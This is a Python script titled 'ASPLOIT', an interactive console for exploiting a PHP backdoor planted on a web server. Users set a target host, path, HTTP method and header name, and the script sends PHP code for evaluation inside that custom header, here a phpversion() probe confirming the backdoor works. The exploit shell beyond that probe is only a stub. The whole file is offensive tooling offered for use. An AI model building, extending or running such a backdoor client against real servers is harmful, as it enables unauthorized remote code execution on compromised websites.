#!/usr/bin/env python3
# @brief This python script will exploit a custom backdoor placed in on a
#       website endpoint.
import os  # system calls
import traceback  # Exception stack trace
import requests  # HTTP requests
import readline  # command history and other features

# @brief Exception raised to exit program.
class ExitException(Exception):
    pass

# @brief Exception raised for command errors. Must be raised with a message.
class CommandException(Exception):
    pass

"""
@brief The ExploitProcessor class accepts commands passed into it and processes
        it to be sent to the backdoored server.
"""
class ExploitProcessor():
    """
    @brief Construct an ExploitProcessor.
    @param host the hostname of the backdoored server.
    @param path the path of the backdoored resource.
    @param method the HTTP method to access the backdoor with.
    @param header the HTTP header containing the backdoor.
    @pre \p host is a valid backdoored host.
    @pre \p path is the path to a valid backdoored resource.
    @pre \p method is allowed by the target.
    @pre \p header corresponds to the server side backdoor.
    @throw CommandException if the connection fails.
    """
    def __init__(self, host: str, path: str, method: str, header: str):
        self.socket = None
        self.directory = ""
        self.__make_connection(host, path, method, header)

    """
    @brief method to start a connection with the backdoored resource.
    @param host the hostname of the backdoored server.
    @param path the path of the backdoored resource.
    @param method the HTTP method to access the backdoor with.
    @param header the HTTP header containing the backdoor.
    @pre \p host is a valid backdoored host.
    @pre \p path is the path to a valid backdoored resource.
    @pre \p method is allowed by the target.
    @pre \p header corresponds to the server side backdoor.
    @throw CommandException if the connection fails.
    """
    def __make_connection(self,
                          host: str,
                          path: str,
                          method: str,
                          header: str):
        try:
            self.__send_message(host, path, method, header,
                                f"header('{header}: ' . phpversion()); exit;")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, and"
                                   f" METHOD are correct.")
    
    """
    @brief method to start a connection with the backdoored resource.
    @param host the hostname of the backdoored server.
    @param path the path of the backdoored resource.
    @param method the HTTP method to access the backdoor with.
    @param header the HTTP header containing the backdoor.
    @param message the message to be sent to the backdoor.
    @pre \p host is a valid backdoored host.
    @pre \p path is the path to a valid backdoored resource.
    @pre \p method is allowed by the target.
    @pre \p header corresponds to the server side backdoor.
    @pre \p message is proper and can be evaluated.
    @throw CommandException if the server doesn't respond with success.
    """
    def __send_message(self,
                        host: str,
                        path: str,
                        method: str,
                        header: str,
                        message: str):
        url = f"{host}{path}"
        if not host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                method,
                url,
                headers={ f"{header}": message }
            )
            if not response.ok:
                raise Exception()
            print("Successfully exploited", response.headers[header])
        except:
            raise CommandException(f"Unable to send messages to server.")


"""
@brief The CommandProcessor class accepts commands passed into it and processes
        it appropriately to be ran on the client machine.
"""
class CommandProcessor():
    """
    @brief constructs/initalizes a CommandProcessor instance.
    """
    def __init__(self):
        self.commands = {
            "help": { 
                "method": self.__help,
                "description": "Display the help screen."
            },
            "exit": {
                "method": self.__exit,
                "description": "Exit the program."
            },
            "exploit": { 
                "method": self.__exploit,
                "description": ("Start the exploit, "
                    "given the preconditions are met.")
            },
            "clear": {
                "method": self.__clear,
                "description": "Clear the screen."
            },
            "set": {
                "method": self.__set,
                "description": "Set or display exploit variables."
            }
        }

        # exploit variables
        self.variables = {
            "TARGET_HOST": {"value": "", "required": True},
            "TARGET_PATH": {"value": "/", "required": True},
            "TARGET_TYPE": {"value": "PHP", "required": True},
            "METHOD": {"value": "GET", "required": True},
            "HEADER": {"value": "EXPLOIT", "required": True}
        }

        self.exploit = None

    """
    @brief Help command that prints commands and their usage.
    @param options The specific command to display help for.
    """
    def __help(self, options: str):
        # if no command is specified
        if len(options) == 0:
            for command in self.commands:
                print((f"    {'{0: <10}'.format(command)}"
                       f" {self.commands[command]['description']}"))
        else:  # look up specific command
            if options in self.commands:
                print((f"    "
                      f"{options}: {self.commands[options]['description']}"))
            else:  # command does not exist
                raise CommandException(f"    '{options}' command not found.")

    """
    @brief Command to exit the program or the exploit shell.
    @throw ExitException to exit the program.
    @param options Not used.
    """
    def __exit(self, options: str):
        if self.exploit:
            # exit shell
            self.exploit = None
        else:
            # exit program
            raise ExitException()
    
    """
    @brief Command to clear the screen.
    @param options Not used.
    @pre the required exploit variables have been set.
    @throw CommandException if the pre-condition is not met.
    """
    def __exploit(self, options: str):
        if self.exploit_status() == True:
            raise CommandException("Already exploited target.")
        for var in self.variables:
            if (self.variables[var]["required"] and
                len(self.variables[var]["value"]) == 0):
                raise CommandException(f"{var} not set.")
        print((f"Attempting to exploit "
               f"{self.variables['TARGET_HOST']['value']} "
               f"at {self.variables['TARGET_PATH']['value']}"))
        
        self.exploit = (
            ExploitProcessor(self.variables['TARGET_HOST']['value'],
                             self.variables['TARGET_PATH']['value'],
                             self.variables['METHOD']['value'],
                             self.variables['HEADER']['value']))

    """
    @brief Command to set exploit variables.
    @param the variable to be set and the value, if any.
    @throw CommandException if the variable does not exist, or if the value is
            invalid.
    """
    def __clear(self, options: str):
        if os.name == 'nt':  # Windows
            os.system("cls")
        else:  # POSIX
            os.system("clear")

    """
    @brief Command to set and display exploit variables.
    @param the variable to be set and the value, if any.
    @throw CommandException if the variable does not exist, or if the value is
            invalid.
    """
    def __set(self, options: str):
        if len(options) == 0:  # list all variables
            print((f"{'{0: <20}'.format(f'VARIABLE')} "
                   f"{'{0: <50}'.format('VALUE')} "
                   f"REQUIRED"))
            for var in self.variables:
                print((f"{'{0: <20}'.format(var)} "
                       f"{'{0: <50}'.format(self.variables[var]['value'])} "
                       f"{str(self.variables[var]['required']).upper()}"))
        else:
            split = options.split(" ", 1)
            var = split[0].upper()
            if var in self.variables:
                value = ""
                if len(split) > 1:
                    value = split[1]
                self.variables[var]["value"] = value
                print(f"'{var}' set to '{value}'")
            else:
                raise CommandException(f"'{var}' is not a variable.")

    """
    @brief Processes a command string.
    @param command A string representing the whole command to be processed.
    @pre \p command is a valid command to be ran.
    @pre \p command has its preconditions met. 
    @throw CommandException if the command doesn't exist.
    """
    def process_command(self, command: str):
        split = command.split(" ", 1)
        base = split[0]

        options = ""
        if len(split) > 1:
            options = split[1]
        
        if base in self.commands:
            self.commands[base]["method"](options)
        else:
            raise CommandException(
                f"'{command.split(' ', 1)[0]}' command not found.")
    
    """
    @brief Getter for exploit status (True or False)
    @return bool for if we are in the exploit shell.
    """
    def exploit_status(self):
        return self.exploit is not None

if __name__ == "__main__":
    processor = CommandProcessor()
    try:
        print("Welcome to ASPLOIT.")
        print("For help, type 'help'")
        while (True):
            pre = " > "
            if processor.exploit_status():
                pre = "sploit > "
            command = input(pre)
            try:
                processor.process_command(command)
            except CommandException as e:
                print(str(e))
    except ExitException:
        print("Exiting...")
    except KeyboardInterrupt:
        print()
        print("Keyboard Interrupt")
    except Exception:
        print("Unrecoverable Exception: ")
        print(traceback.format_exc())
    finally:
        print("Goodbye.")

